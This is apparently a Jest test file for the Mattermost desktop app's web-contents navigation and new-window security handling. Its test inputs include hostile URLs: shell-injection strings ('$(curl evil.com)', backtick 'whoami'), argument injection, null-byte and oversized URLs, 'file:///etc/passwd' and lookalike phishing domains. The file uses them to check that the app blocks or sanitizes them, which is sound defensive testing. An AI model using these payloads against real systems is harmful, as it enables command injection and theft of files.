// Copyright (c) 2016-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

'use strict';

import {BrowserWindow, shell} from 'electron';

import MessageModal from 'app/mainWindow/modals/messageModal';
import NavigationManager from 'app/navigationManager';
import WebContentsManager from 'app/views/webContentsManager';
import Config from 'common/config';
import {getLevel} from 'common/log';
import ContextMenu from 'main/contextMenu';
import LocalNetworkAccessManager from 'main/security/localNetworkAccess';

import PluginsPopUpsManager from './pluginsPopUps';
import {WebContentsEventManager} from './webContentEvents';
import {generateHandleConsoleMessage} from './webContentEventsCommon';

import allowProtocolDialog from '../../main/security/allowProtocolDialog';

jest.mock('electron', () => ({
    app: {},
    shell: {
        openExternal: jest.fn(),
    },
    BrowserWindow: jest.fn(),
    session: {},
}));
jest.mock('app/mainWindow/modals/messageModal', () => ({
    __esModule: true,
    default: {
        showErrorModal: jest.fn(),
    },
}));
jest.mock('main/contextMenu', () => jest.fn());
jest.mock('app/mainWindow/mainWindow', () => ({
    get: jest.fn(),
}));
jest.mock('main/security/allowProtocolDialog', () => ({}));
jest.mock('app/callsWidgetWindow', () => ({}));
jest.mock('common/views/viewManager', () => ({
    getViewByWebContentsId: jest.fn(),
    handleDeepLink: jest.fn(),
}));

jest.mock('app/views/pluginsPopUps', () => ({
    handleNewWindow: jest.fn(() => ({action: 'allow'})),
    generateHandleCreateWindow: jest.fn(() => jest.fn()),
}));

jest.mock('main/security/localNetworkAccess', () => ({
    __esModule: true,
    default: {
        registerWebContents: jest.fn(),
        unregisterWebContents: jest.fn(),
    },
}));

jest.mock('main/utils', () => ({
    composeUserAgent: jest.fn(),
}));

jest.mock('common/config', () => ({
    spellcheck: true,
}));

jest.mock('main/app/utils', () => ({
    flushCookiesStore: jest.fn(),
}));

jest.mock('common/constants', () => ({
    MATTERMOST_PROTOCOL: 'mattermost',
    MAX_URL_LENGTH: 8192,
}));

jest.mock('main/security/allowProtocolDialog', () => ({
    handleDialogEvent: jest.fn().mockResolvedValue(undefined),
}));

jest.mock('app/views/webContentsManager', () => ({
    getViewByWebContentsId: jest.fn(),
    getServerURLByViewId: jest.fn(),
}));

jest.mock('app/navigationManager', () => ({
    openLinkInNewTab: jest.fn(),
}));

jest.mock('main/i18nManager', () => ({
    localizeMessage: jest.fn(),
}));

describe('main/views/webContentsEvents', () => {
    const event = {preventDefault: jest.fn()};

    describe('willNavigate', () => {
        const webContentsEventManager = new WebContentsEventManager();
        webContentsEventManager.getServerURLFromWebContentsId = () => new URL('http://server-1.com');
        const willNavigate = webContentsEventManager.generateWillNavigate(1);
        const popupWindowSpy = jest.spyOn(webContentsEventManager, 'isTrustedPopupWindow');

        afterEach(() => {
            event.preventDefault.mockClear();
            popupWindowSpy.mockReset();
            webContentsEventManager.customLogins = {};
            webContentsEventManager.popupWindow = undefined;
        });

        it('should allow navigation when url isTeamURL', () => {
            willNavigate(event, 'http://server-1.com/subpath');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should allow navigation when url isAdminURL', () => {
            willNavigate(event, 'http://server-1.com/admin_console/subpath');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should allow navigation when isTrustedPopup', () => {
            popupWindowSpy.mockReturnValue(true);
            willNavigate(event, 'http://externalurl.com/popup/subpath');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should allow navigation when protocol is mailto', () => {
            willNavigate(event, 'mailto:test@mattermost.com');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should allow navigation when it isChannelExportUrl', () => {
            willNavigate(event, 'http://server-1.com/plugins/com.mattermost.plugin-channel-export/api/v1/export');
            expect(event.preventDefault).not.toBeCalled();
        });

        it('should prevent navigation for invalid URLs', () => {
            willNavigate(event, 'not-a-valid-url');
            expect(event.preventDefault).toBeCalled();
        });

        it('should not allow navigation under any other circumstances', () => {
            willNavigate(event, 'http://someotherurl.com');
            expect(event.preventDefault).toBeCalled();
        });
    });

    describe('willNavigate with trusted auth origins', () => {
        const serverURL = new URL('https://server.example.com');
        const idp = 'https://login.example.com';
        const fiveMinutes = 5 * 60 * 1000;

        let manager;
        let logger;
        let now;
        let dateSpy;

        // Returns true when the navigation was blocked.
        const blocked = (url, webContentsId = 1) => {
            const ev = {preventDefault: jest.fn()};
            manager.generateWillNavigate(webContentsId)(ev, url);
            return ev.preventDefault.mock.calls.length > 0;
        };

        beforeEach(() => {
            manager = new WebContentsEventManager();
            manager.getServerURLFromWebContentsId = (id) => (id === 99 ? undefined : serverURL);
            WebContentsManager.getViewByWebContentsId.mockReturnValue({id: 'view-1'});
            logger = {info: jest.fn(), debug: jest.fn(), warn: jest.fn(), error: jest.fn()};
            manager.log = () => logger;
            Config.data = {trustedAuthOrigins: [idp]};
            now = 1_000_000;
            dateSpy = jest.spyOn(Date, 'now').mockImplementation(() => now);
        });

        afterEach(() => {
            dateSpy.mockRestore();
            Config.data = undefined;
            WebContentsManager.getViewByWebContentsId.mockReset();
        });

        it('should allow navigation to a trusted auth origin', () => {
            expect(blocked(`${idp}/auth/realms/example/protocol/openid-connect/auth?state=abc`)).toBe(false);
        });

        it('should block the same host when it is not listed', () => {
            Config.data = {trustedAuthOrigins: []};
            expect(blocked(`${idp}/auth`)).toBe(true);
        });

        it('should block http, other-port, subdomain and lookalike variants of a listed origin', () => {
            expect(blocked('http://login.example.com/auth')).toBe(true);
            expect(blocked('https://login.example.com:8443/auth')).toBe(true);
            expect(blocked('https://evil.login.example.com/auth')).toBe(true);
            expect(blocked('https://login.example.com.evil.com/auth')).toBe(true);
        });

        it('should not trust auth origins for web contents that have no server', () => {
            expect(blocked(`${idp}/auth`, 99)).toBe(true);
        });

        // The Calls widget and pop-out also resolve a server URL but are not server views: they are meant to stay
        // pinned to their own page and must not be able to hop to a sign-in provider or wander the server.
        it('should not apply trusted auth origins or the return leg to web contents that are not server views', () => {
            WebContentsManager.getViewByWebContentsId.mockReturnValue(undefined);

            expect(blocked(`${idp}/auth`, 5)).toBe(true);
            expect(blocked(`${serverURL.origin}/oauth/callback`, 5)).toBe(true);
        });

        it('should not open an auth window for web contents that are not server views', () => {
            WebContentsManager.getViewByWebContentsId.mockReturnValue(undefined);
            blocked(`${idp}/auth`, 5);
            WebContentsManager.getViewByWebContentsId.mockReturnValue({id: 'view-1'});

            expect(blocked(`${serverURL.origin}/oauth/callback`, 5)).toBe(true);
        });

        it('should allow the return to the server (e.g. /oauth/callback) after a trusted auth hop', () => {
            expect(blocked(`${idp}/auth`)).toBe(false);
            expect(blocked(`${serverURL.origin}/oauth/callback?code=1&state=2`)).toBe(false);
        });

        it('should block /oauth/callback when no trusted auth hop happened first', () => {
            expect(blocked(`${serverURL.origin}/oauth/callback?code=1&state=2`)).toBe(true);
        });

        it('should still block other external origins during the auth window', () => {
            expect(blocked(`${idp}/auth`)).toBe(false);
            expect(blocked('https://evil.example.com/')).toBe(true);
        });

        it('should stop allowing the return path once the auth window has expired', () => {
            expect(blocked(`${idp}/auth`)).toBe(false);
            now += fiveMinutes + 1;
            expect(blocked(`${serverURL.origin}/oauth/callback`)).toBe(true);
        });

        it('should keep the auth window open while the user navigates within the IdP', () => {
            expect(blocked(`${idp}/auth`)).toBe(false);
            now += fiveMinutes - 1000;
            expect(blocked(`${idp}/auth/login-actions/authenticate`)).toBe(false);
            now += fiveMinutes - 1000;
            expect(blocked(`${serverURL.origin}/oauth/callback`)).toBe(false);
        });

        it('should end the auth window once the load lands on a normal team URL', () => {
            expect(blocked(`${idp}/auth`)).toBe(false);
            expect(blocked(`${serverURL.origin}/oauth/callback`)).toBe(false);
            expect(blocked(`${serverURL.origin}/team/channels/town-square`)).toBe(false);
            expect(blocked(`${serverURL.origin}/oauth/callback`)).toBe(true);
        });

        it('should scope the auth window to the web contents that made the hop', () => {
            expect(blocked(`${idp}/auth`, 1)).toBe(false);
            expect(blocked(`${serverURL.origin}/oauth/callback`, 2)).toBe(true);
        });

        // The origin is all that is needed to add a provider to the list. Paths can carry tokens or identifiers.
        it('should log only the origin of a blocked URL, never its path or query string', () => {
            blocked('https://other.example.com/reset/PATHTOKEN123/confirm?state=SECRETSTATE&nonce=SECRETNONCE');

            const messages = logger.info.mock.calls.map((call) => call.join(' ')).join('\n');
            expect(messages).toContain('https://other.example.com');
            expect(messages).not.toContain('PATHTOKEN123');
            expect(messages).not.toContain('/reset/');
            expect(messages).not.toContain('SECRETSTATE');
            expect(messages).not.toContain('SECRETNONCE');
        });

        it('should log only the scheme of a blocked URL that has no origin', () => {
            blocked('mattermost://SECRETHOST/secret/path?q=SECRETQUERY');

            const messages = logger.info.mock.calls.map((call) => call.join(' ')).join('\n');
            expect(messages).toContain('mattermost:');
            expect(messages).not.toContain('SECRETHOST');
            expect(messages).not.toContain('SECRETQUERY');
        });
    });

    describe('addWebContentsEventListeners', () => {
        const setupContents = () => {
            const handlers = {};
            const contents = {
                id: 1,
                on: jest.fn((eventName, handler) => {
                    handlers[eventName] = handler;
                }),
                once: jest.fn(),
                removeListener: jest.fn(),
                setWindowOpenHandler: jest.fn(),
            };
            return {handlers, contents};
        };

        it('should attach distinct main-frame and subframe navigation guards and remove both', () => {
            const webContentsEventManager = new WebContentsEventManager();
            const {handlers, contents} = setupContents();

            webContentsEventManager.addWebContentsEventListeners(contents);

            expect(contents.on).toHaveBeenCalledWith('will-navigate', expect.any(Function));
            expect(contents.on).toHaveBeenCalledWith('will-frame-navigate', expect.any(Function));
            expect(contents.on).toHaveBeenCalledWith('will-redirect', expect.any(Function));

            // Distinct from will-navigate so a main-frame navigation is not processed twice.
            expect(handlers['will-frame-navigate']).not.toBe(handlers['will-navigate']);

            webContentsEventManager.removeWebContentsListeners(1);

            expect(contents.removeListener).toHaveBeenCalledWith('will-navigate', handlers['will-navigate']);
            expect(contents.removeListener).toHaveBeenCalledWith('will-frame-navigate', handlers['will-frame-navigate']);
            expect(contents.removeListener).toHaveBeenCalledWith('will-redirect', handlers['will-redirect']);
        });

        it('redirect guard applies the main-frame policy to main-frame redirects', () => {
            const webContentsEventManager = new WebContentsEventManager();
            webContentsEventManager.getServerURLFromWebContentsId = () => new URL('http://server-1.com');
            const {handlers, contents} = setupContents();
            webContentsEventManager.addWebContentsEventListeners(contents);
            const willRedirect = handlers['will-redirect'];

            const internalEvent = {preventDefault: jest.fn(), isMainFrame: true, url: 'http://server-1.com/subpath'};
            willRedirect(internalEvent, internalEvent.url);
            expect(internalEvent.preventDefault).not.toHaveBeenCalled();

            const externalEvent = {preventDefault: jest.fn(), isMainFrame: true, url: 'http://someotherurl.com'};
            willRedirect(externalEvent, externalEvent.url);
            expect(externalEvent.preventDefault).toHaveBeenCalled();
        });

        it('redirect guard lets a main-frame redirect through a trusted auth origin and back to the server', () => {
            Config.data = {trustedAuthOrigins: ['https://login.example.com']};
            WebContentsManager.getViewByWebContentsId.mockReturnValue({id: 'view-1'});
            try {
                const webContentsEventManager = new WebContentsEventManager();
                webContentsEventManager.getServerURLFromWebContentsId = () => new URL('https://server.example.com');
                webContentsEventManager.log = () => ({info: jest.fn(), debug: jest.fn(), warn: jest.fn(), error: jest.fn()});
                const {handlers, contents} = setupContents();
                webContentsEventManager.addWebContentsEventListeners(contents);
                const willRedirect = handlers['will-redirect'];

                const redirectTo = (url) => {
                    const ev = {preventDefault: jest.fn(), isMainFrame: true, url};
                    willRedirect(ev, url);
                    return ev.preventDefault.mock.calls.length > 0;
                };

                expect(redirectTo('https://login.example.com/auth/realms/x?state=1')).toBe(false);
                expect(redirectTo('https://server.example.com/oauth/callback?code=1')).toBe(false);
                expect(redirectTo('https://evil.example.com/')).toBe(true);
            } finally {
                Config.data = undefined;
                WebContentsManager.getViewByWebContentsId.mockReset();
            }
        });

        it('redirect guard clears the auth window when the web contents listeners are removed', () => {
            Config.data = {trustedAuthOrigins: ['https://login.example.com']};
            WebContentsManager.getViewByWebContentsId.mockReturnValue({id: 'view-1'});
            try {
                const webContentsEventManager = new WebContentsEventManager();
                webContentsEventManager.getServerURLFromWebContentsId = () => new URL('https://server.example.com');
                webContentsEventManager.log = () => ({info: jest.fn(), debug: jest.fn(), warn: jest.fn(), error: jest.fn()});
                const {handlers, contents} = setupContents();
                webContentsEventManager.addWebContentsEventListeners(contents);

                handlers['will-redirect']({preventDefault: jest.fn(), isMainFrame: true}, 'https://login.example.com/auth');
                webContentsEventManager.removeWebContentsListeners(1);

                // Same id reused by a fresh web contents must not inherit the previous round trip
                const freshHandlers = setupContents();
                webContentsEventManager.addWebContentsEventListeners(freshHandlers.contents);
                const ev = {preventDefault: jest.fn(), isMainFrame: true};
                freshHandlers.handlers['will-redirect'](ev, 'https://server.example.com/oauth/callback');
                expect(ev.preventDefault).toHaveBeenCalled();
            } finally {
                Config.data = undefined;
                WebContentsManager.getViewByWebContentsId.mockReset();
            }
        });

        it('redirect guard applies the subframe policy to subframe redirects', () => {
            const webContentsEventManager = new WebContentsEventManager();
            webContentsEventManager.getServerURLFromWebContentsId = () => new URL('http://server-1.com');
            const {handlers, contents} = setupContents();
            webContentsEventManager.addWebContentsEventListeners(contents);
            const willRedirect = handlers['will-redirect'];

            // External redirects are how ordinary embeds work, so they stay allowed for subframes.
            const embedEvent = {preventDefault: jest.fn(), isMainFrame: false, url: 'https://www.youtube.com/embed/abc'};
            willRedirect(embedEvent, embedEvent.url);
            expect(embedEvent.preventDefault).not.toHaveBeenCalled();

            const protocolEvent = {preventDefault: jest.fn(), isMainFrame: false, url: 'custom://payload'};
            willRedirect(protocolEvent, protocolEvent.url);
            expect(protocolEvent.preventDefault).toHaveBeenCalled();
        });

        it('subframe guard ignores main-frame navigations (handled by will-navigate)', () => {
            const webContentsEventManager = new WebContentsEventManager();
            const {handlers, contents} = setupContents();
            webContentsEventManager.addWebContentsEventListeners(contents);

            const frameEvent = {preventDefault: jest.fn(), isMainFrame: true, url: 'https://example.com/anything'};
            handlers['will-frame-navigate'](frameEvent);

            expect(frameEvent.preventDefault).not.toHaveBeenCalled();
        });

        it('subframe guard allows web embeds (http/https/about) but blocks other protocols', () => {
            const webContentsEventManager = new WebContentsEventManager();
            const {handlers, contents} = setupContents();
            webContentsEventManager.addWebContentsEventListeners(contents);
            const willFrameNavigate = handlers['will-frame-navigate'];

            const allowed = ['https://www.youtube.com/embed/abc', 'http://example.com/widget', 'about:blank', 'about:srcdoc'];
            allowed.forEach((url) => {
                const ev = {preventDefault: jest.fn(), isMainFrame: false, url};
                willFrameNavigate(ev);
                expect(ev.preventDefault).not.toHaveBeenCalled();
            });

            const blocked = ['tel:+15551234', 'mailto:user@example.com', 'custom://payload', 'file:///etc/passwd'];
            blocked.forEach((url) => {
                const ev = {preventDefault: jest.fn(), isMainFrame: false, url};
                willFrameNavigate(ev);
                expect(ev.preventDefault).toHaveBeenCalled();
            });
        });
    });

    describe('newWindow', () => {
        const webContentsEventManager = new WebContentsEventManager();
        const newWindow = webContentsEventManager.generateNewWindowListener(1, true);

        const mockContextMenu = {
            reload: jest.fn(),
            dispose: jest.fn(),
        };

        beforeEach(() => {
            webContentsEventManager.getServerURLFromWebContentsId = jest.fn().mockImplementation(() => new URL('http://server-1.com'));

            BrowserWindow.mockImplementation(() => ({
                once: jest.fn(),
                show: jest.fn(),
                loadURL: jest.fn(),
                webContents: {
                    on: jest.fn(),
                    setWindowOpenHandler: jest.fn(),
                },
            }));
            ContextMenu.mockImplementation(() => mockContextMenu);
            mockContextMenu.dispose.mockClear();
        });

        afterEach(() => {
            webContentsEventManager.popupWindow = undefined;
            jest.clearAllMocks();
        });
        it('should deny and show dialog on bad URL', () => {
            expect(newWindow({url: 'a-bad<url'})).toStrictEqual({action: 'deny'});
            expect(MessageModal.showErrorModal).toHaveBeenCalled();
        });

        it('should open URLs with non-standard characters externally', () => {
            expect(newWindow({url: 'https://google.com/?^'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('https://google.com/?^');
        });

        it('should open MS Teams URLs with curly braces in query string', () => {
            const teamsUrl = 'https://teams.microsoft.com/l/message/19:meeting_abc@thread.v2/123?context={%22contextType%22:%22chat%22}';
            expect(newWindow({url: teamsUrl})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith(teamsUrl);
        });

        it('should allow dev tools to open', () => {
            expect(newWindow({url: 'devtools://aaaaaa.com'})).toStrictEqual({action: 'allow'});
        });

        it('should defer about:blank to PluginsPopUpsManager', () => {
            expect(newWindow({url: 'about:blank'})).toStrictEqual({action: 'allow'});
            expect(PluginsPopUpsManager.handleNewWindow).toHaveBeenCalledWith(1, {url: 'about:blank'});
        });

        it('should divert to allowProtocolDialog for custom protocols that are not mattermost or http', () => {
            const url = 'spotify:album:2OZbaW9tgO62ndm375lFZr';
            expect(newWindow({url})).toStrictEqual({action: 'deny'});
            expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
        });

        describe('should block malicious URLs', () => {
            it('should sanitize argument injection before passing to protocol dialog', () => {
                const maliciousUrl = String.raw`customproto:///" --data-dir "\\deans-mbp\mattermost`;
                expect(newWindow({url: maliciousUrl})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(maliciousUrl);
            });

            it('should reject UNC paths with no scheme and show dialog', () => {
                const uncPath = String.raw`\\server\share\file.exe`;
                expect(newWindow({url: uncPath})).toStrictEqual({action: 'deny'});
                expect(MessageModal.showErrorModal).toHaveBeenCalled();
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
            });

            it('should route file: protocol through confirmation dialog', () => {
                const url = 'file:///etc/passwd';
                expect(newWindow({url})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
            });

            it('should reject URLs with literal null bytes and show dialog', () => {
                expect(newWindow({url: 'customproto:///path\x00malicious'})).toStrictEqual({action: 'deny'});
                expect(MessageModal.showErrorModal).toHaveBeenCalled();
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
            });

            it('should reject URLs with percent-encoded null bytes and show dialog', () => {
                expect(newWindow({url: 'customproto:///path%00malicious'})).toStrictEqual({action: 'deny'});
                expect(MessageModal.showErrorModal).toHaveBeenCalled();
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
            });

            it('should reject completely malformed URIs with no scheme and show dialog', () => {
                expect(newWindow({url: 'not-a-url-at-all'})).toStrictEqual({action: 'deny'});
                expect(MessageModal.showErrorModal).toHaveBeenCalled();
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
            });

            it('should reject oversized URLs from window.open and show dialog', () => {
                const oversizedURL = `http://example.com/${'A'.repeat(1000000)}`;
                expect(newWindow({url: oversizedURL})).toStrictEqual({action: 'deny'});
                expect(MessageModal.showErrorModal).toHaveBeenCalled();
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).not.toBeCalled();
            });
        });

        describe('should sanitize shell-relevant characters via serialization', () => {
            it('should percent-encode backticks', () => {
                const url = 'customproto:///path/`whoami`';
                expect(newWindow({url})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
            });

            it('should encode spaces in $() shell expansion patterns', () => {
                const url = 'customproto:///$(curl evil.com)';
                expect(newWindow({url})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
            });

            it('should preserve double-encoded values without double-decoding', () => {
                const url = 'customproto:///path%2520with%2520spaces';
                expect(newWindow({url})).toStrictEqual({action: 'deny'});
                expect(shell.openExternal).not.toBeCalled();
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
            });
        });

        describe('should handle mixed-case schemes', () => {
            it('should lowercase the scheme for ONENOTE:', () => {
                const url = 'ONENOTE:///path';
                expect(newWindow({url})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
            });

            it('should lowercase the scheme for mixed case OneNote:', () => {
                const url = 'OneNote:///path';
                expect(newWindow({url})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(url);
            });
        });

        describe('should handle legitimate custom protocol URLs from the original issue', () => {
            it('should allow OneNote URLs with curly braces', () => {
                const onenoteUrl = 'onenote:///D:/OneNote/Apps/Test.one#Page&page-id={840EDD0C-B6FB-481E-A342-E39AEDA50EE6}';
                expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl);
            });

            it('should allow OneNote URLs with backslashes', () => {
                const onenoteUrl = String.raw`onenote:///D:\OneNote\Apps\Mattermost.one#Sch%C3%B6ne%20neue%20Seite&page-id={840EDD0C-B6FB-481E-A342-E39AEDA50EE6}`;
                expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl);
            });

            it('should allow OneNote URLs with unicode and emoji', () => {
                const onenoteUrl = 'onenote:///C:/notebook/section.one#Schöne%20Seite%20🌞';
                expect(newWindow({url: onenoteUrl})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(onenoteUrl);
            });

            it('should allow SharePoint URLs', () => {
                const sharepointUrl = 'ms-word:ofe|u|https://company.sharepoint.com/sites/team/Documents/file.docx';
                expect(newWindow({url: sharepointUrl})).toStrictEqual({action: 'deny'});
                expect(allowProtocolDialog.handleDialogEvent).toBeCalledWith(sharepointUrl);
            });
        });

        it('should open in the browser when there is no server matching', () => {
            WebContentsManager.getViewByWebContentsId.mockReturnValue(undefined);
            expect(newWindow({url: 'http://server-2.com/subpath'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('http://server-2.com/subpath');
        });

        it('should open public file links in browser', () => {
            expect(newWindow({url: 'http://server-1.com/api/v4/public/files/myfile.img'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('http://server-1.com/api/v4/public/files/myfile.img');
        });

        it('should open help links in the browser', () => {
            expect(newWindow({url: 'http://server-1.com/help/helplink'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('http://server-1.com/help/helplink');
        });

        it('should open team links in the app', () => {
            expect(newWindow({url: 'http://server-1.com/myteam/channels/mychannel'})).toStrictEqual({action: 'deny'});
            expect(NavigationManager.openLinkInNewTab).toBeCalledWith(new URL('http://server-1.com/myteam/channels/mychannel'));
        });

        it('should prevent admin links from opening in a new window', () => {
            expect(newWindow({url: 'http://server-1.com/admin_console/somepage'})).toStrictEqual({action: 'deny'});
        });

        it('should prevent from opening a new window if popup already exists', () => {
            webContentsEventManager.popupWindow = {win: {webContents: {getURL: () => 'http://server-1.com/myplugin/login'}}};
            expect(newWindow({url: 'http://server-1.com/myplugin/login'})).toStrictEqual({action: 'deny'});
        });

        it('should open popup window for plugins', () => {
            expect(newWindow({url: 'http://server-1.com/plugins/myplugin/login'})).toStrictEqual({action: 'deny'});
            expect(webContentsEventManager.popupWindow).toBeTruthy();
            expect(jest.mocked(LocalNetworkAccessManager.registerWebContents)).toHaveBeenCalled();
        });

        it('should open popup window for managed resources', () => {
            expect(newWindow({url: 'http://server-1.com/trusted/login'})).toStrictEqual({action: 'deny'});
            expect(webContentsEventManager.popupWindow).toBeTruthy();
        });

        it('should open external URIs in browser', () => {
            expect(newWindow({url: 'https://google.com'})).toStrictEqual({action: 'deny'});
            expect(shell.openExternal).toBeCalledWith('https://google.com/');
        });

        it('should dispose context menu when popup window closes', () => {
            let closedCallback;
            const mockPopup = {
                once: jest.fn((event, callback) => {
                    if (event === 'closed') {
                        closedCallback = callback;
                    }
                }),
                show: jest.fn(),
                loadURL: jest.fn(),
                webContents: {
                    id: 99,
                    on: jest.fn(),
                    setWindowOpenHandler: jest.fn(),
                },
            };
            BrowserWindow.mockImplementation(() => mockPopup);

            newWindow({url: 'http://server-1.com/plugins/myplugin/login'});

            expect(webContentsEventManager.popupWindow).toBeTruthy();
            expect(webContentsEventManager.popupWindow.contextMenu).toBe(mockContextMenu);
            expect(closedCallback).toBeDefined();

            closedCallback();
            expect(jest.mocked(LocalNetworkAccessManager.unregisterWebContents)).toHaveBeenCalledWith(99);
            expect(mockContextMenu.dispose).toHaveBeenCalled();
        });
    });

    describe('consoleMessage', () => {
        const webContentsEventManager = new WebContentsEventManager();
        const logObject = {
            error: jest.fn(),
            warn: jest.fn(),
            debug: jest.fn(),
            withPrefix: jest.fn().mockReturnThis(),
        };
        webContentsEventManager.log = jest.fn().mockReturnValue(logObject);
        const consoleMessage = generateHandleConsoleMessage(logObject);

        afterEach(() => {
            getLevel.mockReset();
        });

        it('should respect logging levels', () => {
            consoleMessage({level: 'info', message: 'test0', lineNumber: 0, sourceId: ''});
            expect(logObject.debug).toHaveBeenCalledWith('test0');

            consoleMessage({level: 'info', message: 'test1', lineNumber: 0, sourceId: ''});
            expect(logObject.debug).toHaveBeenCalledWith('test1');

            consoleMessage({level: 'warning', message: 'test2', lineNumber: 0, sourceId: ''});
            expect(logObject.warn).toHaveBeenCalledWith('test2');

            consoleMessage({level: 'error', message: 'test3', lineNumber: 0, sourceId: ''});
            expect(logObject.error).toHaveBeenCalledWith('test3');
        });

        it('should only add line numbers for debug and silly', () => {
            getLevel.mockReturnValue('debug');
            consoleMessage({level: 'info', message: 'test1', lineNumber: 42, sourceId: 'meaning_of_life.js'});
            expect(logObject.debug).toHaveBeenCalledWith('test1', '(meaning_of_life.js:42)');

            getLevel.mockReturnValue('warn');
            consoleMessage({level: 'info', message: 'test2', lineNumber: 42, sourceId: 'meaning_of_life.js'});
            expect(logObject.warn).not.toHaveBeenCalledWith('test2', '(meaning_of_life.js:42)');
        });
    });
});
